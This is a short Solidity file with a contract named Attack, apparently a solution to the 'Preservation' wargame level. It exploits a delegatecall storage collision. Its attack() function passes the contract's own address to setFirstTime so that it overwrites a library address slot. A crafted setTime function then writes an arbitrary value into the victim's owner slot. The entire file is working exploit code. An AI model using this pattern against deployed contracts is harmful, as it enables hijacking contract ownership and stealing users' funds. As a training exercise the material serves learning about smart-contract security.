// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Preservation.sol";

contract Attack { 

    address public timeZone1Library;
    address public timeZone2Library;
    address public owner; 
    uint storedTime;
    bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));
    Preservation public preservation;

    constructor(address _preservation){
        preservation = Preservation(_preservation);
    }

    function attack() public {
        uint attackContract = uint(uint160(address(this)));
        preservation.setFirstTime(attackContract);
    }

    function setTime(uint _time) public {
        address ownerAddr = address(uint160(_time));
        owner = ownerAddr;
    }
    
}
